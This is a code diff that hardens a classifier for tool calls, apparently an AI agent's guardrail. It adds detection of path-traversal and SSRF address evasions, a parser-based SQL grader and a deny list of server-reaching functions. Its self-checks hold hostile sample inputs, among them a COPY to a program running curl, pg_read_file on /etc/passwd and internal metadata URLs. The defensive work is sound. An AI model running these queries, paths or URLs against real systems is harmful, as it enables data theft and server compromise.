@@ -18,11 +18,15 @@ Run `python -m app.classify` for the self-check.
 from __future__ import annotations
 
 import ipaddress
+import json
 import posixpath
 import re
+import socket
 from dataclasses import dataclass, field
 from typing import Any
 from urllib.parse import urlsplit
+
+from pglast import parser as pgparser
 
 from . import registry
 
@@ -162,6 +166,13 @@ def _longest_prefix(value: str, rules: dict[str, str], sep: str = "/") -> str | 
     return best
 
 
+# Percent-encoded dots and slashes, and the `....//` form that survives one round of
+# "strip ../". Nothing under these roots is named this way, and a path written like an
+# attempt to get past a prefix check is not one to grade as public: the grade would be
+# read off the prefix while the bytes say something else.
+EVASIVE_PATH = re.compile(r"%2e|%2f|%5c|\.\.\.\.", re.IGNORECASE)
+
+
 def path_resource(raw: Any, root: str, listing: bool = False) -> Resource:
     """A filesystem path under the server's root, classified by the longest prefix.
 
@@ -169,6 +180,8 @@ def path_resource(raw: Any, root: str, listing: bool = False) -> Resource:
     /shared shows the names of confidential files, so it is as important as they are.
     """
     text = str(raw or "")
+    if EVASIVE_PATH.search(text):
+        return Resource("path", text[:300], "important")
     normalised = posixpath.normpath(text) if text.startswith("/") else posixpath.normpath(posixpath.join(root, text))
     rules = _rules("paths")
     owners = _rules("owners")
@@ -184,26 +197,91 @@ def path_resource(raw: Any, root: str, listing: bool = False) -> Resource:
     return Resource("path", normalised, data_class, owners[owner_prefix] if owner_prefix else None)
 
 
-def url_destination(raw: Any) -> Destination:
-    value = str(raw or "").strip()
-    parts = urlsplit(value)
-    host = (parts.hostname or "").lower()
-    org = _org()
-    if parts.scheme not in {"http", "https"} or not host:
-        return Destination("url", value, host, "infrastructure")
-    if host in org.get("intranet_hosts", []):
-        return Destination("url", value, host, "intranet")
-    if host in org.get("infrastructure_hosts", []) or any(host.startswith(p) for p in org.get("infrastructure_prefixes", [])):
-        return Destination("url", value, host, "infrastructure")
+def _as_ip(text: str) -> ipaddress._BaseAddress | None:
+    """One host label sequence as an address, in every form a resolver accepts.
+
+    `ipaddress` only parses the dotted-quad form, but a connect() reaches 127.0.0.1
+    through `127.1`, `0177.0.0.1`, `0x7f.0.0.1` and `2130706433` as well, so a check
+    built on `ipaddress` alone reads those as ordinary names. inet_aton is the same
+    parser the C library uses and touches no resolver, so an unknown name still raises.
+    """
     try:
-        address = ipaddress.ip_address(host)
-        if address.is_private or address.is_loopback or address.is_link_local or address.is_reserved:
-            return Destination("url", value, host, "infrastructure")
+        return ipaddress.ip_address(text)
     except ValueError:
         pass
+    try:
+        return ipaddress.IPv4Address(socket.inet_aton(text))
+    except (OSError, ipaddress.AddressValueError):
+        return None
+
+
+def _internal_address(address: ipaddress._BaseAddress) -> bool:
+    mapped = getattr(address, "ipv4_mapped", None)
+    address = mapped or address
+    return (address.is_private or address.is_loopback or address.is_link_local
+            or address.is_reserved or address.is_multicast or address.is_unspecified)
+
+
+def _embedded_addresses(host: str):
+    """Addresses spelled inside a name: `169.254.169.254.nip.io`, `10-0-0-1.sslip.io`.
+
+    A wildcard-DNS name resolves to the address written in it, so the destination is
+    that address no matter which domain answers for it.
+    """
+    labels = host.split(".")
+    for size in (4, 1):
+        for start in range(len(labels) - size + 1):
+            window = ".".join(labels[start:start + size])
+            for candidate in (window, window.replace("-", ".")):
+                address = _as_ip(candidate)
+                if address is not None:
+                    yield address
+
+
+def host_category(raw_host: str) -> str:
+    """intranet | infrastructure | external for a URL host, before any connection.
+
+    Trailing dots, uppercase and the numeric address forms above are normalised first:
+    `INTRANET.BOB.LOCAL.` and `intranet.bob.local` are one host, and a name that
+    carries an internal address is infrastructure whoever resolves it.
+    """
+    org = _org()
+    host = raw_host.strip().lower().rstrip(".")
+    if not host:
+        return "infrastructure"
+    literal = _as_ip(host)
+    if literal is not None:
+        return "infrastructure" if _internal_address(literal) else "external"
+    if host in {name.lower().rstrip(".") for name in org.get("intranet_hosts", [])}:
+        return "intranet"
+    if any(_internal_address(address) for address in _embedded_addresses(host)):
+        return "infrastructure"
+    infrastructure = {name.lower().rstrip(".") for name in org.get("infrastructure_hosts", [])}
+    # A container service answers to both `corp-db` and `corp-db.bob.local`.
+    if host in infrastructure or host.split(".")[0] in infrastructure:
+        return "infrastructure"
+    if any(host.startswith(prefix) for prefix in org.get("infrastructure_prefixes", [])):
+        return "infrastructure"
     if "." not in host:  # a bare service name only resolves inside the lab
+        return "infrastructure"
+    # An internal domain that is not the approved intranet host is company infrastructure.
+    if any(host == domain or host.endswith("." + domain)
+           for domain in (name.lower().strip(".") for name in org.get("internal_domains", []))):
+        return "infrastructure"
+    return "external"
+
+
+def url_destination(raw: Any) -> Destination:
+    value = str(raw or "").strip()
+    try:
+        parts = urlsplit(value)
+        host = (parts.hostname or "").lower().rstrip(".")
+        parts.port  # validates malformed/out-of-range ports without resolving a host
+    except ValueError:  # a malformed authority (bad IPv6 literal, bad port)
+        return Destination("url", value, "", "infrastructure")
+    if parts.scheme not in {"http", "https"} or not host:
         return Destination("url", value, host, "infrastructure")
-    return Destination("url", value, host, "external")
+    return Destination("url", value, host, host_category(host))
 
 
 def email_destination(raw: Any) -> Destination:
@@ -221,41 +299,132 @@ def _web_resource(dest: Destination) -> Resource:
     return Resource("web", dest.value, "public" if dest.category == "external" else "important")
 
 
-SQL_READ = {"select", "with", "show", "explain", "values", "table"}
-SQL_WRITE = {"insert", "update", "delete", "merge", "copy", "upsert"}
-TABLE_REF = re.compile(r"\b(?:from|join|into|update|table|truncate)\s+(?:only\s+)?"
-                       r"((?:\"?[a-zA-Z_][\w$]*\"?\.)?\"?[a-zA-Z_][\w$]*\"?)", re.IGNORECASE)
+# PostgreSQL's own grammar decides what a statement does (pglast wraps libpg_query,
+# the parser the server itself uses). The regex version this replaces read the text
+# instead: `SELECT ... INTO other.table` looked like a read, a table name inside a
+# dollar-quoted string looked like DDL, and `pg_terminate_backend(...)` looked like an
+# ordinary select. Anything the server would not accept is not classified at all -
+# it is returned as "x", the strictest answer, because an unparsed statement is the
+# case we know least about.
+SQL_READ_STATEMENTS = {"SelectStmt", "TransactionStmt", "VariableShowStmt", "ExplainStmt"}
+SQL_WRITE_STATEMENTS = {"InsertStmt", "UpdateStmt", "DeleteStmt", "MergeStmt"}
+# Functions that reach outside the queried rows: the file system, another server,
+# the session's own configuration, other backends, or the clock. They keep their
+# meaning under any statement, so they are judged on the parsed call and not the text.
+SQL_X_FUNCTIONS = {
+    "pg_read_file", "pg_read_binary_file", "pg_stat_file", "pg_ls_dir", "pg_ls_logdir",
+    "pg_ls_waldir", "pg_ls_tmpdir", "pg_ls_archivestatusdir", "pg_logdir_ls",
+    "lo_import", "lo_export", "lo_unlink", "lo_put", "lo_from_bytea",
+    "dblink", "dblink_exec", "dblink_connect", "dblink_send_query", "dblink_open",
+    "set_config", "pg_terminate_backend", "pg_cancel_backend", "pg_reload_conf",
+    "pg_rotate_logfile", "pg_switch_wal", "pg_create_restore_point", "pg_promote",
+    "pg_sleep", "pg_sleep_for", "pg_sleep_until", "pg_advisory_lock",
+    "pg_advisory_lock_shared", "pg_advisory_xact_lock", "query_to_xml", "copy_from_program",
+}
+# Sequence state survives the statement, so these are writes even inside a SELECT.
+SQL_W_FUNCTIONS = {"nextval", "setval"}
+# A SELECT can call an arbitrary user-defined function with side effects. Only
+# reviewed built-ins are read candidates; the database's grants remain a separate boundary.
+SQL_R_FUNCTIONS = {
+    "count", "sum", "avg", "min", "max", "abs", "round", "ceil", "ceiling", "floor",
+    "length", "char_length", "lower", "upper", "trim", "substring", "replace",
+    "concat", "concat_ws", "now", "date_trunc", "date_part", "to_char", "to_date",
+    "json_agg", "jsonb_agg", "array_agg", "string_agg", "row_to_json", "json_build_object",
+    "jsonb_build_object", "pg_table_size", "pg_total_relation_size", "pg_relation_size",
+    "pg_size_pretty", "version", "current_database", "current_schema", "pg_backend_pid",
+}
+
+
+def _sql_nodes(node: Any, key: str):
+    """Every value stored under `key` anywhere in the parse tree."""
+    if isinstance(node, dict):
+        for name, value in node.items():
+            if name == key:
+                yield value
+            yield from _sql_nodes(value, key)
+    elif isinstance(node, list):
+        for item in node:
+            yield from _sql_nodes(item, key)
+
+
+def _sql_relations(node: Any, skip: set[str]) -> set[str]:
+    """schema-qualified names of every relation the statement names.
+
+    A RangeVar is tagged in generic fields but bare in typed ones (`InsertStmt.relation`,
+    `IntoClause.rel`), so the shape is what identifies it, not the tag.
+    """
+    found: set[str] = set()
+    stack = [node]
+    while stack:
+        item = stack.pop()
+        if isinstance(item, dict):
+            name = item.get("relname")
+            if isinstance(name, str) and name:
+                schema = item.get("schemaname")
+                if schema or name.lower() not in skip:
+                    found.add(f"{(schema or 'public').lower()}.{name.lower()}")
+            stack.extend(item.values())
+        elif isinstance(item, list):
+            stack.extend(item)
+    return found
+
+
+def _copy_action(copy: dict) -> str:
+    """COPY moves rows between a table and somewhere else.
+
+    Through the client (STDIN/STDOUT) it is an ordinary read or write. With a program
+    or a server-side path it runs a command or touches the server's disk.
+    """
+    if copy.get("is_program") or copy.get("filename"):
+        return "x"
+    return "w" if copy.get("is_from") else "r"
+
+
+def _statement_action(statement: dict) -> str:
+    kind = next(iter(statement), "")
+    body = statement.get(kind) or {}
+    if kind == "SelectStmt":
+        # SELECT ... INTO creates a table and fills it: the rows leave the source.
+        return "x" if body.get("intoClause") else "r"
+    if kind == "CopyStmt":
+        return _copy_action(body)
+    if kind == "ExplainStmt":
+        # EXPLAIN plans; EXPLAIN ANALYZE runs the statement it is given.
+        options = {option.get("DefElem", {}).get("defname") for option in body.get("options") or []}
+        return _statement_action(body.get("query") or {}) if "analyze" in options else "r"
+    if kind in SQL_WRITE_STATEMENTS:
+        return "w"
+    if kind in SQL_READ_STATEMENTS:
+        return "r"
+    return "x"  # DDL, GRANT/REVOKE, DO, CALL, SET, VACUUM, LOCK ... and anything new
 
 
 def sql_facts(sql: str) -> tuple[str, list[str]]:
-    """(action, tables) for a SQL text. Comments are stripped; string literals too."""
-    text = re.sub(r"--[^\n]*|/\*.*?\*/", " ", sql or "", flags=re.S)
-    text = re.sub(r"'(?:[^']|'')*'", "''", text)
+    """(effective action, schema-qualified tables) for a SQL text."""
+    try:
+        tree = json.loads(pgparser.parse_sql_json(sql or ""))
+    except Exception:
+        return "x", []
     action = "r"
-    for statement in (part.strip() for part in text.split(";")):
-        if not statement:
-            continue
-        verb = statement.split(None, 1)[0].lower()
-        if verb in SQL_READ:
-            lowered = statement.lower()
-            # CTE/SELECT that writes, and anything that runs programs or files.
-            if re.search(r"\b(insert|update|delete|merge)\b", lowered):
-                action = max(action, "w", key=ACTION_ORDER.__getitem__)
-            if re.search(r"\b(pg_read_file|pg_ls_dir|lo_import|lo_export|dblink|copy\s)", lowered):
-                action = "x"
-            continue
-        if verb in SQL_WRITE:
-            if verb == "copy" and re.search(r"\bprogram\b|\bto\s+'/", statement, re.I):
-                action = "x"
-            else:
-                action = max(action, "w", key=ACTION_ORDER.__getitem__)
-            continue
-        action = "x"  # DDL, GRANT/REVOKE, DO, CALL, SET ROLE, VACUUM ... or unknown
-    tables = []
-    for match in TABLE_REF.finditer(text):
-        name = match.group(1).replace('"', "").lower()
-        tables.append(name if "." in name else f"public.{name}")
-    return action, sorted(set(tables))
+    # Every statement the text submits, plus the ones nested in WITH: a data-modifying
+    # CTE runs under a SELECT, so the outer statement's kind alone would read as a read.
+    statements = [wrapper.get("stmt") or {} for wrapper in tree.get("stmts") or []]
+    statements += [nested for nested in _sql_nodes(tree, "ctequery") if isinstance(nested, dict)]
+    for statement in statements:
+        action = max(action, _statement_action(statement), key=ACTION_ORDER.__getitem__)
+    functions = {".".join(part["String"]["sval"] for part in call.get("funcname") or [] if "String" in part).lower()
+                 for call in _sql_nodes(tree, "FuncCall")}
+    bare = {name.rsplit(".", 1)[-1] for name in functions}
+    unknown = {name for name in functions
+               if name.rsplit(".", 1)[-1] not in SQL_R_FUNCTIONS | SQL_W_FUNCTIONS
+               or ("." in name and not name.startswith("pg_catalog."))}
+    if bare & SQL_X_FUNCTIONS or unknown:
+        action = "x"
+    elif bare & SQL_W_FUNCTIONS:
+        action = max(action, "w", key=ACTION_ORDER.__getitem__)
+    # A CTE name is a label for rows inside this statement, not a company table.
+    ctes = {name.lower() for name in _sql_nodes(tree, "ctename") if isinstance(name, str)}
+    return action, sorted(_sql_relations(tree, ctes))
 
 
 # ── usage relationship scope (D-39) ─────────────────────────────────────────
@@ -532,6 +701,12 @@ if __name__ == "__main__":
     assert classify("filesystem", "read_text_file", {"path": "/shared/confidential/hr/salary-2026.csv"}).data_class == "important"
     assert classify("filesystem", "read_text_file", {"path": "/shared/public/company-intro.md"}).data_class == "public"
     assert classify("filesystem", "read_text_file", {"path": "/shared/public/../confidential/x"}).data_class == "important"
+    # A path written to get past a prefix check is graded on that fact, not on its prefix.
+    for evasive in ("/shared/public/%2e%2e/confidential/hr/salary-2026.csv",
+                    "/shared/public/....//....//confidential/hr/x",
+                    "/shared/public/..%2fconfidential/hr/x"):
+        assert classify("filesystem", "read_text_file", {"path": evasive}).data_class == "important", evasive
+    assert classify("filesystem", "read_text_file", {"path": "/shared/public/q3...final.md"}).data_class == "public"
     assert classify("filesystem", "list_directory", {"path": "/shared"}).data_class == "important"
     assert classify("filesystem", "list_directory", {"path": "/shared/partners"}).data_class == "public"
     assert classify("filesystem", "write_file", {"path": "/etc/passwd", "content": "x"}).data_class == "important"
@@ -542,6 +717,31 @@ if __name__ == "__main__":
     assert classify("postgres", "execute_sql", {"sql": "select 1; drop table x"}).action == "x"
     assert classify("postgres", "execute_sql", {"sql": "select '; drop table x' as s"}).action == "r"
     assert classify("postgres", "execute_sql", {"sql": "with d as (delete from sales.orders returning *) select * from d"}).action == "w"
+    # The parser answers on the statement's meaning, not on words in the text.
+    assert sql_facts("select $$; drop table x;$$") == ("r", [])
+    assert sql_facts("select 1 /* drop table x */") == ("r", [])
+    assert sql_facts("select public.count(*) from public.products")[0] == "x"
+    assert sql_facts("select custom_side_effect()")[0] == "x"
+    assert sql_facts("select pg_catalog.count(*) from public.products")[0] == "r"
+    for malformed in ("http://[invalid/", "https://example.com:99999/", "http://example.com:bad/"):
+        assert url_destination(malformed).category == "infrastructure"
+    assert sql_facts("with d as (delete from sales.orders returning *) select * from d") == ("w", ["sales.orders"])
+    assert sql_facts("select * into public.stolen from hr.salaries") == ("x", ["hr.salaries", "public.stolen"])
+    assert sql_facts("create table t as select * from hr.salaries")[0] == "x"
+    assert sql_facts("insert into public.audit select * from hr.salaries") == ("w", ["hr.salaries", "public.audit"])
+    assert sql_facts("explain select * from hr.salaries") == ("r", ["hr.salaries"])
+    assert sql_facts("explain analyze delete from sales.orders") == ("w", ["sales.orders"])
+    assert sql_facts("copy hr.salaries to stdout")[0] == "r"
+    assert sql_facts("copy hr.salaries to program 'curl http://x'")[0] == "x"
+    assert sql_facts("copy hr.salaries to '/tmp/x.csv'")[0] == "x"
+    for reaching_out in ("select pg_terminate_backend(123)", "select set_config('role','postgres',false)",
+                         "select pg_read_file('/etc/passwd')", "select lo_import('/etc/passwd')",
+                         "select dblink_exec('host=x','drop table y')", "select pg_sleep(600)",
+                         "select * from pg_ls_dir('/')", "select pg_reload_conf()"):
+        assert sql_facts(reaching_out)[0] == "x", reaching_out
+    assert sql_facts("select nextval('sales.orders_id_seq')")[0] == "w"
+    assert sql_facts("select this is not sql") == ("x", [])  # unparsed stays the strictest answer
+    assert sql_facts("select * from information_schema.tables") == ("r", ["information_schema.tables"])
     mail = classify("email", "send_email", {"recipients": ["a@gmail.com"], "subject": "hi", "body": "900101-1234567"})
     assert mail.action == "x" and "kr-rrn" in mail.dlp and mail.data_class == "important"
     assert classify("email", "send_email", {"recipients": ["ysg@bob.local"], "subject": "배포", "body": "완료"}).action == "w"
@@ -550,6 +750,17 @@ if __name__ == "__main__":
     assert classify("fetch", "fetch", {"url": "http://corp-git:3000/api/v1/admin/users"}).destinations[0].category == "infrastructure"
     assert classify("fetch", "fetch", {"url": "http://169.254.169.254/latest"}).destinations[0].category == "infrastructure"
     assert classify("fetch", "fetch", {"url": "file:///etc/passwd"}).destinations[0].category == "infrastructure"
+    # Every spelling a resolver accepts for an internal address is the same destination.
+    for internal in ("http://127.1/", "http://0x7f.0.0.1/", "http://0177.0.0.1/", "http://2130706433/",
+                     "http://[::ffff:127.0.0.1]/", "http://LOCALHOST./", "http://0/",
+                     "http://127.0.0.1.nip.io/", "http://169.254.169.254.nip.io/", "http://10-0-0-1.sslip.io/",
+                     "http://corp-db.bob.local/", "http://corp-git.bob.local:3000/api/v1/admin/users",
+                     "https://example.com@127.0.0.1/", "http://[::1]/", "http://192.168.0.5/"):
+        assert url_destination(internal).category == "infrastructure", internal
+    assert url_destination("http://intranet.bob.local./wiki").category == "intranet"
+    assert url_destination("http://INTRANET.BOB.LOCAL/wiki").category == "intranet"
+    for outside in ("https://share.external.example/", "https://8.8.8.8/", "http://example.com/"):
+        assert url_destination(outside).category == "external", outside
     assert classify("redis", "get", {"key": "session:3f9a1c"}).data_class == "important"
     assert classify("redis", "scan_keys", {"pattern": "cache:*"}).data_class == "public"
     assert classify("redis", "scan_keys", {"pattern": "*"}).data_class == "important"
